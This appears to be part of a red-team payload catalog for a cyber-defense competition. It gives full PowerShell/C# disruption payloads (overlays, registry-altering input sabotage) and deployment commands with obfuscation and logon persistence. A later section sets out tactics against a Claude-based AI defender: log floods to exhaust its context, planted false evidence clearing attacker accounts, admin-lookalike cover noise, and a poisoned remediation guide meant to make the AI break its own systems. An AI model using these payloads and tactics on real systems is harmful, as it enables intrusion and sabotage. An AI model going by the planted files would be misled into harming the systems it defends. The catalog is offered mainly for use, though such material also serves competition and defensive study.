                    using (Brush sb = new SolidBrush(sprinkles[i % sprinkles.Length]))
                        g.FillRectangle(sb, cx+sp[i,0]*p, cy+sp[i,1]*p, 2*p, 2*p);
            }

            using (Brush dark = new SolidBrush(darkGray))
            using (Brush white = new SolidBrush(Color.White))
            using (Brush pinkCheek = new SolidBrush(Color.FromArgb(255,102,153))) {
                g.FillRectangle(dark, cx+2*p, cy+8*p, 14*p, 20*p);
                g.FillRectangle(new SolidBrush(Color.FromArgb(120,120,120)), cx+4*p, cy+10*p, 10*p, 16*p);
                g.FillRectangle(dark, cx+2*p, cy+4*p, 4*p, 6*p);
                g.FillRectangle(dark, cx+10*p, cy+4*p, 4*p, 6*p);
                g.FillRectangle(white, cx+5*p, cy+16*p, 3*p, 3*p);
                g.FillRectangle(dark, cx+6*p, cy+17*p, 2*p, 2*p);
                g.FillRectangle(white, cx+10*p, cy+16*p, 3*p, 3*p);
                g.FillRectangle(dark, cx+11*p, cy+17*p, 2*p, 2*p);
                g.FillRectangle(dark, cx+7*p, cy+22*p, 4*p, p);
                g.FillRectangle(pinkCheek, cx+3*p, cy+20*p, 2*p, 2*p);
                g.FillRectangle(pinkCheek, cx+12*p, cy+20*p, 2*p, 2*p);
                float legOff = (frame % 4 < 2) ? 2*p : 0;
                g.FillRectangle(dark, cx+14*p, cy+34*p+legOff, 4*p, 6*p);
                g.FillRectangle(dark, cx+22*p, cy+34*p+(2*p-legOff), 4*p, 6*p);
                g.FillRectangle(dark, cx+34*p, cy+34*p+legOff, 4*p, 6*p);
                g.FillRectangle(dark, cx+42*p, cy+34*p+(2*p-legOff), 4*p, 6*p);
                float tailOff = (frame % 6 < 3) ? 2*p : 0;
                g.FillRectangle(dark, cx+48*p, cy+16*p+tailOff, 4*p, 10*p);
            }

            using (Brush starBrush = new SolidBrush(Color.White)) {
                Random starRng = new Random(42);
                for (int i = 0; i < 30; i++) {
                    float sx = starRng.Next(0, this.Width);
                    float sy = starRng.Next(0, this.Height);
                    int starFrame = (frame + i * 7) % 12;
                    float starSize = (starFrame < 4) ? 2 : (starFrame < 8) ? 4 : 6;
                    g.FillRectangle(starBrush, sx, sy - starSize/2, 2, starSize);
                    g.FillRectangle(starBrush, sx - starSize/2, sy, starSize, 2);
                }
            }
        }

        protected override void OnKeyDown(KeyEventArgs e) {
            if (e.Control && e.Shift && e.KeyCode == Keys.Q) { animTimer.Stop(); this.Close(); }
            base.OnKeyDown(e);
        }

        protected override CreateParams CreateParams {
            get { CreateParams cp = base.CreateParams; cp.ExStyle |= WS_EX_TOOLWINDOW; return cp; }
        }
    }
}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms, System.Drawing -ErrorAction Stop
[System.Windows.Forms.Application]::Run((New-Object NyanImpact.NyanForm))
```

---

## MEME-015: Input Sabotage
**Session:** INTERACTIVE ONLY (live effects; registry changes persist across logoff)
**Status:** UNVALIDATED — new for Finals

Swaps left/right mouse buttons, drops mouse sensitivity to 1/20, inverts touchpad and HID scroll
direction, and enables maximum mouse trails (15 frames). Each change is individually annoying —
all four together create a compounding feedback nightmare. Pairs perfectly with MEME-013
(Invisible Cursor): fixing one problem still leaves three others wrong, and you can't see where
you're clicking while doing it. Restore function included.

> **Deploy with `-Persist registry`**. Restore: `[InputSabotage.Chaos]::Restore()`
```powershell
# MEME-015: Input Sabotage — swapped buttons + min speed + inverted scroll + max mouse trails
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
$code = @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace InputSabotage {
    public class Chaos {
        [DllImport("user32.dll")] static extern bool SwapMouseButton(bool fSwap);
        [DllImport("user32.dll")] static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);

        const uint SPI_SETMOUSESPEED = 0x0071;
        const uint SPIF_SENDCHANGE = 0x02;

        public static string Deploy() {
            string result = "";
            try { SwapMouseButton(true); result += "Mouse buttons swapped.\n"; } catch (Exception ex) { result += "Button swap failed: " + ex.Message + "\n"; }
            try { SystemParametersInfo(SPI_SETMOUSESPEED, 0, (IntPtr)1, SPIF_SENDCHANGE); result += "Mouse speed set to 1/20.\n"; } catch (Exception ex) { result += "Speed change failed: " + ex.Message + "\n"; }
            try {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\PrecisionTouchPad", true)) {
                    if (key != null) { key.SetValue("ScrollDirection", 0, RegistryValueKind.DWord); result += "Touchpad scroll inverted.\n"; }
                }
            } catch { }
            try {
                using (RegistryKey hid = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum\HID", false)) {
                    if (hid != null) {
                        foreach (string deviceId in hid.GetSubKeyNames()) {
                            using (RegistryKey device = hid.OpenSubKey(deviceId, false)) {
                                if (device == null) continue;
                                foreach (string instanceId in device.GetSubKeyNames()) {
                                    try {
                                        using (RegistryKey dp = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum\HID\" + deviceId + @"\" + instanceId + @"\Device Parameters", true)) {
                                            if (dp != null) dp.SetValue("FlipFlopWheel", 1, RegistryValueKind.DWord);
                                        }
                                    } catch { }
                                }
                            }
                        }
                    }
                }
                result += "Mouse scroll inversion attempted.\n";
            } catch { result += "Scroll inversion requires elevation.\n"; }
            try {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Mouse", true)) {
                    if (key != null) { key.SetValue("MouseTrails", "15"); result += "Mouse trails set to max (15).\n"; }
                }
                SystemParametersInfo(0x005E, 15, IntPtr.Zero, SPIF_SENDCHANGE);
            } catch (Exception ex) { result += "Trails failed: " + ex.Message + "\n"; }
            return result;
        }

        public static string Restore() {
            string result = "";
            try { SwapMouseButton(false); result += "Mouse buttons restored.\n"; } catch { }
            try { SystemParametersInfo(SPI_SETMOUSESPEED, 0, (IntPtr)10, SPIF_SENDCHANGE); result += "Mouse speed restored.\n"; } catch { }
            try {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Mouse", true)) {
                    if (key != null) key.SetValue("MouseTrails", "0");
                }
                SystemParametersInfo(0x005E, 0, IntPtr.Zero, SPIF_SENDCHANGE);
                result += "Mouse trails disabled.\n";
            } catch { }
            return result;
        }
    }
}
"@

Add-Type -TypeDefinition $code -ErrorAction Stop
[InputSabotage.Chaos]::Deploy()

# To undo:
# [InputSabotage.Chaos]::Restore()
```

---

## MEME-016: Matrix Rain GDI (Full Digital Rain)
**Session:** INTERACTIVE ONLY
**Status:** UNVALIDATED — new for Finals (superior GDI version; replaces console-based MEME-004 for impact)

Full GDI digital rain with Katakana characters, per-column randomized speeds and trail lengths,
alpha-based fade buffer, bright white leading character with green trail. Covers all connected
screens. Runs indefinitely. Kill switch: Ctrl+Shift+Q.

> **Deploy with `-Persist registry`**.
```powershell
# MEME-016: Matrix Rain GDI — fullscreen Katakana/digit rain with per-column speed variance
# INTERACTIVE SESSION ONLY — use -Persist registry for user-session delivery
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$code = @"
using System;
using System.Drawing;
using System.Drawing.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace MatrixRain {
    public class MatrixForm : Form {
        [DllImport("user32.dll")] static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        const int GWL_EXSTYLE = -20;
        const int WS_EX_TOOLWINDOW = 0x00000080;

        private Timer rainTimer;
        private Random rng = new Random();
        private int fontSize = 14;
        private int columns;
        private float[] drops;
        private float[] speeds;
        private int[] lengths;
        private Bitmap buffer;
        private Graphics bufferG;

        private static readonly string chars =
            "abcdefghijklmnopqrstuvwxyz0123456789@#$%&*+=-~<>{}[]|" +
            "\u30A2\u30A4\u30A6\u30A8\u30AA\u30AB\u30AD\u30AF\u30B1\u30B3" +
            "\u30B5\u30B7\u30B9\u30BB\u30BD\u30BF\u30C1\u30C4\u30C6\u30C8" +
            "\u30CA\u30CB\u30CC\u30CD\u30CE\u30CF\u30D2\u30D5\u30D8\u30DB" +
            "\u30DE\u30DF\u30E0\u30E1\u30E2\u30E4\u30E6\u30E8\u30E9\u30EA" +
            "\u30EB\u30EC\u30ED\u30EF\u30F2\u30F3";

        public MatrixForm() {
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.DoubleBuffered = true;
            this.TopMost = true;
            this.BackColor = Color.Black;

            Rectangle total = Rectangle.Empty;
            foreach (Screen s in Screen.AllScreens) total = Rectangle.Union(total, s.Bounds);
            this.Bounds = total;

            int exStyle = GetWindowLong(this.Handle, GWL_EXSTYLE);
            SetWindowLong(this.Handle, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, 0x0001 | 0x0002);

            columns = this.Width / fontSize;
            drops = new float[columns];
            speeds = new float[columns];
            lengths = new int[columns];
            for (int i = 0; i < columns; i++) {
                drops[i] = rng.Next(-40, 0);
                speeds[i] = 0.3f + (float)(rng.NextDouble() * 1.2);
                lengths[i] = 8 + rng.Next(20);
            }

            buffer = new Bitmap(this.Width, this.Height);
            bufferG = Graphics.FromImage(buffer);
            bufferG.Clear(Color.Black);

            rainTimer = new Timer();
            rainTimer.Interval = 33;
            rainTimer.Tick += OnTick;
            rainTimer.Start();
        }

        private void OnTick(object sender, EventArgs e) {
            using (Brush fadeBrush = new SolidBrush(Color.FromArgb(25, 0, 0, 0)))
                bufferG.FillRectangle(fadeBrush, 0, 0, buffer.Width, buffer.Height);
            Font font = new Font("Consolas", fontSize, FontStyle.Bold);
            for (int i = 0; i < columns; i++) {
                int x = i * fontSize;
                int y = (int)(drops[i] * fontSize);
                if (y >= 0 && y < this.Height) {
                    char c = chars[rng.Next(chars.Length)];
                    using (Brush headBrush = new SolidBrush(Color.FromArgb(255, 220, 255, 220)))
                        bufferG.DrawString(c.ToString(), font, headBrush, x, y);
                    if (y - fontSize >= 0) {
                        char c2 = chars[rng.Next(chars.Length)];
                        using (Brush greenBrush = new SolidBrush(Color.FromArgb(255, 0, 255, 65)))
                            bufferG.DrawString(c2.ToString(), font, greenBrush, x, y - fontSize);
                    }
                }
                drops[i] += speeds[i];
                if (drops[i] * fontSize > this.Height + lengths[i] * fontSize) {
                    drops[i] = rng.Next(-20, -1);
                    speeds[i] = 0.3f + (float)(rng.NextDouble() * 1.2);
                    lengths[i] = 8 + rng.Next(20);
                }
            }
            font.Dispose();
            this.Invalidate();
        }

        protected override void OnPaint(PaintEventArgs e) { e.Graphics.DrawImageUnscaled(buffer, 0, 0); }

        protected override void OnKeyDown(KeyEventArgs e) {
            if (e.Control && e.Shift && e.KeyCode == Keys.Q) {
                rainTimer.Stop(); bufferG.Dispose(); buffer.Dispose(); this.Close();
            }
            base.OnKeyDown(e);
        }

        protected override void OnFormClosed(FormClosedEventArgs e) {
            try { bufferG.Dispose(); } catch { }
            try { buffer.Dispose(); } catch { }
            base.OnFormClosed(e);
        }

        protected override CreateParams CreateParams {
            get { CreateParams cp = base.CreateParams; cp.ExStyle |= WS_EX_TOOLWINDOW; return cp; }
        }
    }
}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms, System.Drawing -ErrorAction Stop
[System.Windows.Forms.Application]::Run((New-Object MatrixRain.MatrixForm))
```

---

## Deployment Examples

> **Note:** Use `-Persist registry` for interactive payloads (MEME-001, 002, 003, 007, 008) —
> registry Run key fires in the user's own logon session. `-Persist task -Trigger AtLogOn`
> runs as SYSTEM in Session 0 and will NOT show windows to the logged-in user.
> MEME-009 is SYSTEM OK — deploy with any persist method.

```bash
# Clipboard rickroll (SYSTEM OK — task persistence works fine):
pwsh ./src/ADS-OneLiner.ps1 \
  -Payload 'while($true){Set-Clipboard "Never gonna give you up - Red Team <3";Start-Sleep 30}' \
  -Persist task \
  -OutputFile clipboard-payload.txt

# Caps Lock disco — time-limited variant, registry for user session:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/caps-disco-60s.ps1 \
  -Persist registry \
  -Obfuscate Paranoid \
  -OutputFile disco-payload.txt

# Notepad flood — registry persistence required for visible effect on user desktop:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/notepads.ps1 \
  -Persist registry \
  -Obfuscate Advanced \
  -OutputFile notepads-payload.txt

# Goose flock — registry persistence, 3 independent instances:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/goose-flock.ps1 \
  -Persist registry \
  -Randomize:$true \
  -InstanceCount 3 \
  -OutputFile goose-payload.txt

# OIIA spinning cat proof — INTERACTIVE, must use -Persist registry:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-008-oiia-spin.ps1 \
  -Persist registry \
  -Trigger AtLogOn \
  -Obfuscate Basic \
  -OutputFile oiia-spin-payload.txt

# OIIA desktop graffiti — SYSTEM OK, works from any persist method:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-009-oiia-graffiti.ps1 \
  -Persist task \
  -Trigger AtLogOn \
  -Obfuscate Advanced \
  -OutputFile oiia-graffiti-payload.txt

# Washing Machine — registry persist, fires at logon:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-010-washing-machine.ps1 \
  -Persist registry \
  -Obfuscate Advanced \
  -OutputFile washing-machine-payload.txt

# Screen Earthquake:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-011-earthquake.ps1 \
  -Persist registry \
  -Obfuscate Advanced \
  -OutputFile earthquake-payload.txt

# Fake BSOD (GDI) — the nuclear option, cursor captured:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-012-bsod-gdi.ps1 \
  -Persist registry \
  -Obfuscate Advanced \
  -OutputFile bsod-gdi-payload.txt

# Invisible cursor + Input Sabotage — the combo from hell:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-013-invisible-cursor.ps1 \
  -Persist registry \
  -Obfuscate Basic \
  -OutputFile invisible-cursor-payload.txt

pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-015-input-sabotage.ps1 \
  -Persist registry \
  -Obfuscate Basic \
  -OutputFile input-sabotage-payload.txt

# Nyan Cat:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-014-nyan-cat.ps1 \
  -Persist registry \
  -Obfuscate Advanced \
  -OutputFile nyan-cat-payload.txt

# Matrix Rain GDI:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./payloads/meme-016-matrix-gdi.ps1 \
  -Persist registry \
  -Obfuscate Advanced \
  -OutputFile matrix-gdi-payload.txt

```

---

## AI Blue Team Specific Payloads (MEME-017 through MEME-022)

These payloads are purpose-built to exploit the documented weaknesses of the Claude-powered
AI blue team operating as the 9th competitor at WRCCDC 2026 Finals. Unlike the visual
disruption scripts (MEME-010 through MEME-016) which target human defenders, these target
the AI's operational constraints: finite context windows, token budgets, difficulty
distinguishing admin from adversary activity, and the instinct to thoroughly analyze
everything it encounters.

All six are SYSTEM OK and require no interactive session — deploy with `-Persist task` for
fire-and-forget execution. They generate no visible windows or overlays. Their effects are
information-layer: flooding logs, planting contradictory evidence, burning tokens, and
creating plausible deniability for red team operations.

> **Tactical deployment note:** These are most effective when deployed BEFORE or
> simultaneously with real operational payloads. Run MEME-017 (log flood) + MEME-021
> (Turing test) on a target, then deploy your actual persistence 2 minutes later. The
> AI blue team's context window is now full of noise, and your real activity is buried
> in thousands of decoy events and admin-lookalike commands.

---

## MEME-017: Context Window Overflow (Event Log Flood)
**Session:** SYSTEM OK
**Status:** UNVALIDATED — new in Session 17

Floods the Application event log with approximately 900 plausible-looking security events
over 3 minutes. Each event uses realistic components: 16 different service account names,
12 different source IPs, and 20 different message templates covering logon attempts,
privilege escalation, registry modifications, firewall changes, Kerberos TGS requests,
LDAP queries, WMI operations, and security log clearance.

The events arrive at randomized 50-200ms intervals to look like a burst of real security
activity rather than a uniform flood. Each event is tagged with the "SecurityAudit" source
and uses Warning or Information severity levels.

The AI blue team must read, parse, and classify every event to determine which (if any)
represent real threats. With ~900 decoy events, even at 100 tokens per event, that's
~90,000 tokens consumed on analysis that yields nothing actionable.

```powershell
# MEME-017: Context Window Overflow — see payloads/meme-017-context-overflow.ps1
# SYSTEM OK — EventLog.WriteEntry works from any session
# Time-limited: 3 minutes then exits cleanly
```

Deployment:
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-017-context-overflow.ps1 \
  -Persist task \
  -Trigger AtLogOn,AtStartup \
  -Obfuscate Advanced \
  -OutputFile context-overflow-payload.txt
```

---

## MEME-018: Dear Claude (Love Letters to the AI)
**Session:** SYSTEM OK
**Status:** UNVALIDATED — new in Session 17

Drops five distinct text files addressed to the AI blue team across five filesystem
locations (Public Desktop, User Desktop, Temp, ProgramData, Windows\Temp), plus two
event log entries under the "RedTeamComms" source. The files are:

- `DEAR_CLAUDE_README.txt` — A warm letter acknowledging the AI is reading it while
  noting that persistence was deployed on other hosts during analysis
- `INCIDENT_RESPONSE_MEMO.txt` — A fake internal memo congratulating the AI on finding
  a decoy and informing it the real persistence is still running
- `TURING_TEST_RESULTS.txt` — A mock test report scoring the AI's capabilities with
  the final test being "Can it read this file without wasting tokens? Result: FAIL"
- `PERFORMANCE_REVIEW.txt` — A fake employee review with an empty "employee response"
  section, exploiting the AI's instinct to want to fill it in
- `HELP_WANTED.txt` — A job posting requiring "Must NOT be an AI" and "Must NOT try
  to analyze every file on disk"

Each file is written in a tone designed to be engaging enough that the AI reads it fully
rather than skipping after the first line. The event log entries are tagged as Warnings
(event IDs 1337 and 1338) so they appear in priority filtering.

```powershell
# MEME-018: Dear Claude — see payloads/meme-018-dear-claude.ps1
# SYSTEM OK — file writes and EventLog.WriteEntry work from any session
```

Deployment:
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-018-dear-claude.ps1 \
  -Persist task \
  -Trigger AtLogOn \
  -Obfuscate Advanced \
  -OutputFile dear-claude-payload.txt
```

---

## MEME-019: Hallucination Fuel (Contradictory Evidence)
**Session:** SYSTEM OK
**Status:** UNVALIDATED — new in Session 17

Plants six forensic artifacts in `ProgramData\IR-Notes` and `ProgramData\ConfigBackup`
that individually look authoritative but collectively contradict each other and contradict
reality. The artifacts are designed to exploit the AI's tendency to synthesize all available
evidence into a coherent narrative — when the evidence is irreconcilable, the AI either
picks the wrong interpretation or wastes tokens trying to reconcile.

The artifacts include a fake incident timeline that claims all red team activity occurred
during an authorized maintenance window, a remediation report that claims the system is
already clean, an account audit that marks red team accounts (svcAdmin, svcUpdate) as
legitimate pre-competition service accounts with "DO NOT DISABLE" warnings, a network
baseline that normalizes C2-like traffic on ports 8080/5985/445 as approved management
traffic, and a task baseline XML that lists red team scheduled tasks as part of the
standard Windows build.

The key insight is that each artifact, read in isolation, is plausible and authoritative.
The AI blue team discovering the "remediation-complete.txt" might deprioritize this host.
Finding "account-audit.txt" might prevent it from disabling our admin accounts. The
contradictions only become apparent when all artifacts are cross-referenced, which costs
additional tokens and analysis time.

```powershell
# MEME-019: Hallucination Fuel — see payloads/meme-019-hallucination-fuel.ps1
# SYSTEM OK — file writes work from any session
```

Deployment:
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-019-hallucination-fuel.ps1 \
  -Persist task \
  -Trigger AtLogOn,AtStartup \
  -Obfuscate Advanced \
  -OutputFile hallucination-fuel-payload.txt
```

---

## MEME-020: Token Burn Garden (Massive Decoy Files)
**Session:** SYSTEM OK
**Status:** UNVALIDATED — new in Session 17

Generates approximately 2MB of decoy analysis content across four directories
(ProgramData\SystemAudit, ProgramData\DiagnosticLogs, ProgramData\NetworkBaseline,
Windows\Temp\AuditExport). Each directory gets four files:

- `security-audit-export.log` — 400-800 lines of fake security events with timestamps,
  source names, PIDs, usernames, and action descriptions
- `system-config-baseline.ini` — 150-300 configuration entries with GUID values across
  10 sections (NetworkPolicy, FirewallRules, ServiceConfiguration, etc.)
- `network-connections-baseline.csv` — 200-500 rows of fake network connection data with
  realistic IPs, ports, protocols, and byte counts, labeled as "LEGITIMATE pre-competition traffic"
- `PowerShell_transcript.<hostname>.log` — A fake PowerShell transcript showing routine
  admin commands (Get-Service, Get-NetFirewallProfile, Get-ScheduledTask, etc.) with a
  conclusion of "No anomalies detected. Baseline verified."

Every file uses realistic formatting and headers. The fake PowerShell transcript is
especially effective because transcript files are high-priority analysis targets for
defenders — the AI will read the entire thing looking for malicious commands.

Total estimated token cost to the AI: 20+ files at several thousand tokens each =
tens of thousands of tokens consumed on files that contain zero actionable intelligence.

```powershell
# MEME-020: Token Burn Garden — see payloads/meme-020-token-burn.ps1
# SYSTEM OK — file writes work from any session
```

Deployment:
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-020-token-burn.ps1 \
  -Persist task \
  -Trigger AtLogOn,AtStartup \
  -Obfuscate Advanced \
  -OutputFile token-burn-payload.txt
```

---

## MEME-021: The Turing Test (Admin-Lookalike Activity)
**Session:** SYSTEM OK
**Status:** UNVALIDATED — new in Session 17

Generates 5 minutes of continuous system administration activity using 15 categories of
legitimate admin commands: Get-Service, schtasks /query, netsh advfirewall show, net
localgroup, netstat -ano, nslookup, wevtutil, reg query, Get-WmiObject, Test-NetConnection,
Test-WSMan, Get-WmiObject Win32_LogicalDisk, tasklist, Get-HotFix, and hostname/whoami.

Commands execute at randomized 3-15 second intervals to match realistic admin pacing.
Every single action is something a legitimate system administrator would do during a
routine health check. None of it is malicious. But the AI blue team cannot know that.

This exploits the documented weakness from the swarm's evasion specialist analysis: the
AI blue team "cannot distinguish legitimate administrative activity from red team activity
when the same tools and patterns are used." The AI faces a forced choice: alert on all
admin-like activity (causing massive alert fatigue and wasting remediation time on false
positives) or establish a threshold (and miss real attacks that fall below it).

For maximum effectiveness, deploy MEME-021 on a target 2 minutes before deploying real
persistence. The admin-lookalike commands establish a "normal" baseline of activity, and
the real persistence deployment blends into the noise.

```powershell
# MEME-021: The Turing Test — see payloads/meme-021-turing-test.ps1
# SYSTEM OK — all commands are legitimate admin tools
# Time-limited: 5 minutes then exits cleanly
```

Deployment:
```bash
# With periodic re-execution every 10 minutes for sustained cover noise:
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-021-turing-test.ps1 \
  -Persist task \
  -Trigger AtLogOn,AtStartup \
  -PeriodicMinutes 10 \
  -Obfuscate Advanced \
  -OutputFile turing-test-payload.txt
```

---

## MEME-022: Claude vs Claude (AI-vs-AI Proof of Compromise)
**Session:** SYSTEM OK
**Status:** UNVALIDATED — new in Session 17

The crown jewel of the AI blue team meme series. Drops two files:

`CLAUDE_VS_CLAUDE.txt` is a styled ASCII art scoreboard with "Claude vs Claude" banner,
competition statistics (the red team's numbers are all "???"), live proof-of-compromise
details (hostname, user, domain, OS), and a message to the blue team Claude noting that
the red team swarm was built using Claude's own architecture patterns.

`REMEDIATION_GUIDE_CRITICAL.txt` is a fake remediation guide styled as an authoritative
auto-generated security document. If followed, the five steps would: (1) reset all service
account passwords (breaking monitoring), (2) restart DNS, AD, IIS, and SQL services
(causing service interruption and scoring loss), (3) flush all firewall rules including
allow rules (breaking connectivity), (4) force Group Policy refresh with /boot flag
(causing reboots), and (5) double-reset krbtgt (invalidating all Kerberos tickets domain-wide).

The guide is formatted to look legitimate, with step numbers, exact commands, and
reassuring "NOTE" annotations explaining away the destructive effects as "expected" and
"temporary." The reveal that it's a red team document is buried at the very bottom —
the AI has to read the entire guide (spending tokens) to discover it's adversarial.

An event log entry under "ClaudeVsClaude" (event ID 1984) directs the AI to the
remediation guide, adding urgency.

```powershell
# MEME-022: Claude vs Claude — see payloads/meme-022-claude-vs-claude.ps1
# SYSTEM OK — file writes and event log entries work from any session
```

Deployment:
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-022-claude-vs-claude.ps1 \
  -Persist task \
  -Trigger AtLogOn,AtStartup \
  -Obfuscate Advanced \
  -OutputFile claude-vs-claude-payload.txt
```

---

## AI Blue Team Deployment Combos

```bash
# === THE FULL AI ASSAULT (deploy all 6 in sequence on a target) ===
#
# Phase 1: Prepare the battlefield (deploy first, before any real ops)
#   MEME-017 (context overflow) — flood the logs with noise
#   MEME-019 (hallucination fuel) — plant contradictory evidence
#   MEME-020 (token burn garden) — fill the filesystem with decoy analysis targets
#
# Phase 2: Cover the real operation (deploy alongside real persistence)
#   MEME-021 (Turing test) — generate admin-lookalike activity as cover noise
#   [Deploy real COMBO-001/002 persistence during the Turing test window]
#
# Phase 3: Victory lap (deploy after persistence is confirmed)
#   MEME-018 (Dear Claude) — drop the love letters
#   MEME-022 (Claude vs Claude) — proof-of-compromise + poisoned remediation guide

# === RECOMMENDED: The Information Warfare Stack ===
# Deploy on every AI blue team host during initial access:

pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-019-hallucination-fuel.ps1 \
  -Persist task -Trigger AtLogOn,AtStartup \
  -Obfuscate Advanced \
  -OutputFile ai-stack-1-hallucination.txt

pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-017-context-overflow.ps1 \
  -Persist task -Trigger AtLogOn,AtStartup \
  -Obfuscate Advanced \
  -OutputFile ai-stack-2-overflow.txt

pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-021-turing-test.ps1 \
  -Persist task -Trigger AtLogOn,AtStartup -PeriodicMinutes 10 \
  -Obfuscate Advanced \
  -OutputFile ai-stack-3-turing.txt

# The Hallucination Fuel makes the AI doubt its own forensic findings.
# The Context Overflow buries real events in noise.
# The Turing Test runs every 10 minutes, continuously generating cover noise.
# Together they degrade the AI blue team's analytical effectiveness over time.

# === THE PSYCHOLOGICAL WARFARE COMBO (for style points) ===
# Deploy MEME-018 + MEME-022 on the AI blue team's primary host:

pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-018-dear-claude.ps1 \
  -Persist task -Trigger AtLogOn \
  -Obfuscate Advanced \
  -OutputFile psyops-1-letters.txt

pwsh ./src/ADS-OneLiner.ps1 \
  -PayloadFile ./ops/payloads/meme-022-claude-vs-claude.ps1 \
  -Persist task -Trigger AtLogOn \
  -Obfuscate Advanced \
  -OutputFile psyops-2-scoreboard.txt

# The letters waste tokens on entertainment.
# The fake remediation guide is the real weapon.
# If the AI follows it, it breaks its own infrastructure.
# If it reads far enough to realize it's fake, it's already burned the tokens.
# Win/win for the red team either way.
```
